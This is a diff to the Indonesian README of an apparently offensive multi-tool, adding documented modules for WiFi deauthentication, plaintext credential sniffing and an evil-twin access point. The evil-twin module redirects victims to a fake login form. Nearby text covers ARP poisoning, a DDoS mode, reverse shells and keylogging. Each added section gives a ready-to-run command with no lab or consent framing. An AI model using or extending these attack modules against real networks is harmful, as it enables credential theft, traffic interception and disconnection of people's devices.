@@ -218,14 +218,36 @@ hkall -m netcut --host 192.168.1.50 --gateway 192.168.1.1 --iface wlan0 --second
 ARP poison: target percaya gateway ada di MAC tidak-terpasang (`00:00:00:00:00:00`) → traffic target→gateway
 blackhole → internet target mati sementara. Auto-restore on exit/ctrl-c (cap 120s). Butuh root.
 
-### 5.7 ddos — Load test (bounded)
+### 5.6c deauth — Kick device dari WiFi (root, monitor)
+**Prompt:** interface, AP bssid, client mac (optional), count.
+```bash
+hkall -m deauth --host AA:BB:CC:DD:EE:FF --iface wlan0 --client FF:FF:FF:FF:FF:FF
+```
+Kirim 802.11 deauth frame (aireplay-ng atau raw AF_PACKET) → target terputus dari AP. Butuh monitor mode + root. Peringatan: target di WiFi yang sama.
+
+### 5.6d sniff — Passive capture (HTTP creds + nearby probe) (root)
+**Prompt:** interface, seconds, mode (c=creds HTTP, p=probe WiFi).
+```bash
+hkall -m sniff --iface wlan0 --seconds 10 --client c   # HTTP plaintext creds
+hkall -m sniff --iface wlan0 --seconds 10 --client p   # nearby WiFi probe request
+```
+AF_PACKET raw capture. mode `c`: regex `password|username|Authorization` di port 80. mode `p`: 802.11 probe request → SSID yang device sekitar cari.
+
+### 5.6e eviltwin — Clone AP (root, hostapd+dnsmasq)
+**Prompt:** SSID clone, interface monitor, gateway ip, channel.
+```bash
+hkall -m eviltwin --host MyWiFi --iface wlan0
+```
+Spawn AP palsu (same SSID), DHCP + wildcard DNS redirect → landing page (creds form). Victim konek ke AP palsu → traffic lewat kamu. Butuh `hostapd` + `dnsmasq` (root-repo). Cleanup ctrl-c.
+
+### 5.8 ddos — Load test (bounded)
 **Prompt:** url, concurrency (cap 200), duration (cap 60), method.
 ```bash
 hkall -m ddos --host http://device/load
 ```
 **Output:** ok/err/bytes, req/s.
 
-### 5.8 websec — Orchestrator (chain web test)
+### 5.9 websec — Orchestrator (chain web test)
 ```bash
 hkall -m websec
   [1] web [2] network [3] load
@@ -291,4 +313,4 @@ Full alur: `docs/ONLINE.md`. Ringkasan:
 - **Same LAN**: `--host 192.168.1.x` — direct
 - **Reverse shell (NAT)**: target jalanin payload → connect balik ke attacker; VPS relay kalau perlu
 - **Port-forward**: router forward → scan IP publik
-- Yang local-only: keylog/persist/ops/wifi/mitm/netcut/dnsspoof (butuh akses di tempat tool dijalankan)
+- Yang local-only: keylog/persist/ops/wifi/mitm/netcut/deauth/sniff/eviltwin/dnsspoof (butuh akses di tempat tool dijalankan)
